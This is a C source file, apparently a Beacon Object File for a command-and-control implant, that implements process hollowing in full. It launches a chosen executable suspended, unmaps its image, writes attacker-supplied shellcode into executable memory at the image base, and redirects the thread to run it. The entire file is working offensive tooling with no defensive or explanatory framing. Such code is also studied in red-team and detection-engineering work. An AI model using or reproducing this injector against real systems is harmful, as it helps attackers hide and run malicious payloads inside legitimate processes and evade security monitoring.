/*
 * hollow.c - Process hollowing BOF
 *
 * Spawns a target process suspended, unmaps its original image,
 * writes shellcode at the image base, updates the thread context,
 * and resumes execution.
 *
 * Args:  target executable path (string), shellcode (binary blob)
 */

#include <windows.h>

#define BOF
#include "beacon.h"

/* ── NT type definitions ── */
typedef LONG NTSTATUS;
#define NT_SUCCESS(status) ((NTSTATUS)(status) >= 0)

#ifndef ProcessBasicInformation
#define ProcessBasicInformation 0
#endif

typedef struct _PEB_LDR_DATA_STUB {
    BYTE Reserved[8];
} PEB_LDR_DATA_STUB;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID     Reserved1;
    PVOID     PebBaseAddress;
    PVOID     Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID     Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE           ProcessHandle,
    DWORD            ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength
);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID  BaseAddress
);

/* ── DFR imports ── */
DFR(KERNEL32, CreateProcessA)
DFR(KERNEL32, ReadProcessMemory)
DFR(KERNEL32, WriteProcessMemory)
DFR(KERNEL32, VirtualAllocEx)
DFR(KERNEL32, GetThreadContext)
DFR(KERNEL32, SetThreadContext)
DFR(KERNEL32, ResumeThread)
DFR(KERNEL32, TerminateProcess)
DFR(KERNEL32, CloseHandle)
DFR(KERNEL32, GetModuleHandleA)
DFR(KERNEL32, GetProcAddress)

void go(char* args, int len)
{
    datap parser;
    char* targetPath;
    int   targetPathLen;
    char* shellcode;
    int   shellcodeLen;

    BeaconDataParse(&parser, args, len);
    targetPath   = BeaconDataExtract(&parser, &targetPathLen);
    shellcode    = BeaconDataExtract(&parser, &shellcodeLen);

    if (targetPath == NULL || targetPathLen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "hollow: no target path provided");
        return;
    }
    if (shellcode == NULL || shellcodeLen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "hollow: no shellcode provided");
        return;
    }

    /* Resolve ntdll functions */
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "hollow: failed to get ntdll handle");
        return;
    }

    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)KERNEL32$GetProcAddress(hNtdll, "NtQueryInformationProcess");
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)KERNEL32$GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (!NtQueryInformationProcess || !NtUnmapViewOfSection) {
        BeaconPrintf(CALLBACK_ERROR, "hollow: failed to resolve ntdll functions");
        return;
    }

    /* Create suspended process */
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;

    for (int i = 0; i < (int)sizeof(si); i++) ((char*)&si)[i] = 0;
    for (int i = 0; i < (int)sizeof(pi); i++) ((char*)&pi)[i] = 0;
    si.cb = sizeof(si);

    BOOL created = KERNEL32$CreateProcessA(
        NULL,
        targetPath,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!created) {
        BeaconPrintf(CALLBACK_ERROR, "hollow: CreateProcessA failed for '%s'", targetPath);
        return;
    }

    /* Query PEB address */
    PROCESS_BASIC_INFORMATION pbi;
    ULONG retLen = 0;

    NTSTATUS status = NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &retLen
    );

    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "hollow: NtQueryInformationProcess failed (0x%08X)", status);
        KERNEL32$TerminateProcess(pi.hProcess, 1);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
        return;
    }

    /*
     * Read ImageBaseAddress from PEB.
     * On x64, PEB.ImageBaseAddress is at offset 0x10 from PEB base.
     */
    PVOID imageBase = NULL;
    SIZE_T bytesRead = 0;
    PVOID pebImageBaseAddr = (PVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x10);

    BOOL readOk = KERNEL32$ReadProcessMemory(
        pi.hProcess,
        pebImageBaseAddr,
        &imageBase,
        sizeof(imageBase),
        &bytesRead
    );

    if (!readOk || imageBase == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "hollow: failed to read ImageBaseAddress from PEB");
        KERNEL32$TerminateProcess(pi.hProcess, 1);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
        return;
    }

    /* Unmap original image */
    status = NtUnmapViewOfSection(pi.hProcess, imageBase);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "hollow: NtUnmapViewOfSection failed (0x%08X)", status);
        KERNEL32$TerminateProcess(pi.hProcess, 1);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
        return;
    }

    /* Allocate memory at the original image base */
    PVOID remoteAddr = KERNEL32$VirtualAllocEx(
        pi.hProcess,
        imageBase,
        shellcodeLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (remoteAddr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "hollow: VirtualAllocEx failed at 0x%p", imageBase);
        KERNEL32$TerminateProcess(pi.hProcess, 1);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
        return;
    }

    /* Write shellcode */
    SIZE_T bytesWritten = 0;
    BOOL writeOk = KERNEL32$WriteProcessMemory(
        pi.hProcess,
        remoteAddr,
        shellcode,
        shellcodeLen,
        &bytesWritten
    );

    if (!writeOk) {
        BeaconPrintf(CALLBACK_ERROR, "hollow: WriteProcessMemory failed");
        KERNEL32$TerminateProcess(pi.hProcess, 1);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
        return;
    }

    /* Update thread context - set RCX to our entry point (imageBase) */
    CONTEXT ctx;
    for (int i = 0; i < (int)sizeof(ctx); i++) ((char*)&ctx)[i] = 0;
    ctx.ContextFlags = CONTEXT_FULL;

    if (!KERNEL32$GetThreadContext(pi.hThread, &ctx)) {
        BeaconPrintf(CALLBACK_ERROR, "hollow: GetThreadContext failed");
        KERNEL32$TerminateProcess(pi.hProcess, 1);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
        return;
    }

    ctx.Rcx = (DWORD64)remoteAddr;

    if (!KERNEL32$SetThreadContext(pi.hThread, &ctx)) {
        BeaconPrintf(CALLBACK_ERROR, "hollow: SetThreadContext failed");
        KERNEL32$TerminateProcess(pi.hProcess, 1);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
        return;
    }

    /* Resume the hollowed process */
    KERNEL32$ResumeThread(pi.hThread);

    BeaconPrintf(CALLBACK_OUTPUT, "Hollowed process PID %d, injected %d bytes",
                 pi.dwProcessId, shellcodeLen);

    /* Cleanup */
    KERNEL32$CloseHandle(pi.hThread);
    KERNEL32$CloseHandle(pi.hProcess);
}
